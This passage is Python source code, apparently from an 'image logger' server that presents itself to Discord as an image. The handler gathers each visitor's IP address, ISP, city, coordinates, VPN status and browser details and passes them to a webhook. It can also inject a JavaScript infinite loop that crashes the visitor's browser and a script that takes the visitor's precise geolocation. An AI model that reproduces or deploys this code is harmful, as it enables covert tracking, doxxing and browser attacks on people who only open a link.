                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
